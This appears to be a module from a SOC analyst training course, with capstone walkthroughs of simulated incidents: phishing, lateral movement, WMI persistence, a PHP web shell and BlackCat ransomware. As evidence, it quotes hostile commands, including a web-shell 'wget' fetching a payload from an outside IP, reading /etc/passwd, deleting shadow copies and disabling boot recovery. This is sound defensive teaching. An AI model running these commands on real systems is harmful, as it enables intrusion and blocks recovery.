Module 14: SOC Level 1 Capstone Challenges

The capstone module tests everything you've learned across all 13 previous modules. You'll investigate multi-stage attacks by correlating evidence from multiple sources: PCAPs, SIEM logs, email artifacts, and endpoint telemetry.

Sub-Domains / Rooms

🔹 Tempest

A full incident investigation: correlate PCAP, SIEM data, and email artifacts to trace the attack from initial access to exfiltration.

Tempest Challenge Walkthrough:
Evidence Provided:
- 1 PCAP file (network traffic capture)
- 24 hours of SIEM logs (Windows events + firewall logs)
- 1 phishing email (original .eml file)
- EDR snapshot (process list from compromised host)

Step 1 — Email Analysis:
From: "IT Support"
Subject: "Urgent: Password Expiration Notice"
Attachment: PasswordReset.html (phishing page — collects credentials)
SPF: fail, DKIM: none, DMARC: none
→ Initial access vector: credential harvesting via phishing

Step 2 — PCAP Analysis (Wireshark):
- HTTP POST to 45.33.32.156/login.php with credentials (user: j.smith, pass: Spring2026!)
- 30 minutes later: PowerShell encrypted connection to same IP on port 4444
- 2 hours later: SMB traffic to multiple internal servers (lateral movement)
- 4 hours later: Large outbound data transfer (2.3GB to 185.130.5.201)

Step 3 — SIEM Log Analysis (Splunk):
index=windows EventID=4624 Account_Name=j.smith | timechart count
- j.smith logged into 12 different servers in 2 hours (abnormal — lateral movement)
- EventID 4672 (admin logon) on DC-01 at 16:45 — attacker gained domain admin
- EventID 4720 — new user "helpdesk_adm" created (backdoor account)

Step 4 — Determine Impact:
- 12 servers compromised
- Domain admin credentials stolen
- Customer database exfiltrated (2.3GB)
- Backdoor account created for persistent access

Step 5 — Report & Remediation:
- Root cause: Employee fell for credential harvesting phishing email
- Containment: Reset all compromised accounts, isolate affected servers
- Eradication: Remove backdoor account, run EDR scan on all affected hosts
- Recovery: Restore database from pre-breach backup, enable MFA for all users
- Lessons learned: Implement DMARC enforcement, deploy phishing-resistant MFA, conduct security awareness training

🔹 Boogeyman 1, 2, 3

A three-part investigation of a sophisticated multi-stage attack involving phishing, malware, lateral movement, and threat actor attribution.

Boogeyman Series Overview:

Boogeyman 1 — Initial Access & Malware:
- Analyze a phishing email with malicious macro-enabled document
- Extract the VBA macro, decode the PowerShell payload, identify the malware (Cobalt Strike beacon)
- Trace the C2 infrastructure: domain registration details, IP history, SSL certificate
- Map techniques to MITRE ATT&CK: T1566.001 (Phishing), T1204.002 (User Execution), T1059.003 (PowerShell)

Boogeyman 2 — Lateral Movement & Privilege Escalation:
- Analyze Windows Event Logs to trace the attacker's movement across the network
- Identify credential dumping (EventID 4663 — LSASS access, Sysmon Event 10)
- Track pass-the-hash attacks (EventID 4624 LogonType=3 with NTLM)
- Find privilege escalation to Domain Admin (EventID 4672 on DC)
- Map techniques: T1003.001 (LSASS Memory), T1550.002 (Pass-the-Hash), T1068 (Privilege Escalation)

Boogeyman 3 — Exfiltration & Attribution:
- Analyze outbound network traffic for data exfiltration patterns
- Identify the exfiltration method (HTTPS to cloud storage, FTP, SMB)
- Use threat intel to attribute the attack to a specific threat actor group
- Write the final incident report with full timeline, IOCs, and recommendations
- Implement new detection rules to prevent similar attacks

🔹 Hidden Hooks

Investigate a sophisticated persistence mechanism that evaded initial detection.

Hidden Hooks Scenario:
A user reports their computer is slow. EDR shows no obvious malware. But there's unusual network traffic at 3 AM.

Investigation:
- Check WMI persistence: wmic /namespace:\\root\subscription PATH __EventFilter GET
- Find malicious WMI event subscription that runs PowerShell every hour
- The attacker used WMI persistence (T1546.003) — no files on disk, no registry Run keys
- WMI query: SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
- Action: Deletes beacon, executes from memory only — fileless malware

Detection: WMI persistence is invisible to file-based scans. Need Sysmon Event 19-21 (WMI) or audit WMI activity.

🔹 Open Door — OSINT Investigation

Open Door Scenario:
A data breach occurred. Customer data was posted on a dark web forum. Your job is to use OSINT to investigate.

OSINT Investigation Steps:
- Search the leaked data for patterns (email domains, password patterns, data formats)
- Identify the breach source: Was it a third-party vendor? An exposed database? A phishing campaign?
- Use Shodan to check if any company assets were exposed to the internet
- Use Have I Been Pwned to see if employee emails appear in other breaches
- Use DeHashed to search for company credentials in credential dumps
- Write a report with findings and recommend security improvements

🔹 Upload and Conquer

Investigate a web application breach involving file upload abuse and web shell deployment.

Upload and Conquer Scenario:
Your company's web application allows users to upload profile pictures. An attacker uploaded a PHP web shell disguised as an image.

Detection:
- WAF alert: "File upload with PHP content detected" — POST /upload/profile.php
- File type mismatch: Uploaded as .jpg but content-type is application/x-php
- Subsequent requests: GET /uploads/profile.php?cmd=id (200 OK)
- Commands executed: whoami, uname -a, cat /etc/passwd, wget http://45.33.32.156/exploit

Investigation:
- Check if the web shell accessed sensitive files or databases
- Look for lateral movement from the web server to internal systems
- Check if attacker uploaded additional files (backdoors, phishing pages)
- Review web server access logs for the full scope of compromise

Remediation:
- Remove web shell and any other uploaded malicious files
- Implement file upload validation: check magic bytes, enforce extension matching
- Store uploads outside web root or in cloud storage with no execution permission
- Apply Content Security Policy (CSP) headers

🔹 BlackCat Ransomware Investigation

BlackCat/ALPHV Ransomware Scenario:
Critical alert: "Mass file encryption detected on FINANCE-SRV-01"

Initial Detection:
- EDR alert: vssadmin.exe delete shadows /all /quiet (Volume Shadow Copy deletion — ransomware preparation)
- EDR alert: bcdedit.exe /set {default} recoveryenabled No (disables recovery)
- File system alert: .locked files appearing in shared drives (15,000+ files in 10 minutes)
- Ransom note: "README_TO_DECRYPT.txt" in every directory — demands 50 BTC (~$3M)

Incident Response:
1. Containment: Isolate FINANCE-SRV-01 from network immediately. Block all SMB traffic from this host.
2. Investigate initial access: Check SIEM for recent alerts on FINANCE-SRV-01. Find EventID 4625 (3389 failed RDP attempts from 45.33.32.156 → then success). RDP was exposed to internet.
3. Scope assessment: Check which other servers have SMB connections to FINANCE-SRV-01. 3 other servers show similar encryption patterns.
4. Persistence check: Check for new accounts, scheduled tasks, and service installations on affected hosts.
5. Backup check: Are offline backups available? Yes — from 12 hours ago. Recovery is possible.

Recovery:
- Restore affected servers from clean backups (pre-breach)
- Reset all account passwords on affected systems
- Close RDP port 3389 at firewall, require VPN + MFA for remote access
- Deploy EDR on all servers (FINANCE-SRV-01 didn't have EDR — "cost saving" decision)

Lessons Learned:
- Exposed RDP without MFA was the root cause
- Missing EDR on critical servers delayed detection
- Offline backups saved the company ~$3M in ransom
- New rule: all internet-facing services require MFA + EDR
Capstone Success Checklist
What Your Capstone Report Must Include:
1. Executive Summary: One paragraph — what happened, impact, and key finding
2. Timeline: Chronological sequence of attacker actions with timestamps and evidence references
3. Initial Access: How did the attacker get in? (Phishing? Vulnerability? Credentials?)
4. Attack Chain: Full kill chain from initial access to objectives — with MITRE ATT&CK mappings
5. IOCs: All hashes, IPs, domains, file paths, registry keys, and YARA rules
6. Impact Assessment: What data was accessed? What systems were compromised? Financial impact?
7. Containment Actions: What was done to stop the attack?
8. Remediation Plan: Steps to prevent reoccurrence (patch, config changes, new tools, training)
9. Lessons Learned: What went well? What could be improved? Action items with owners and deadlines
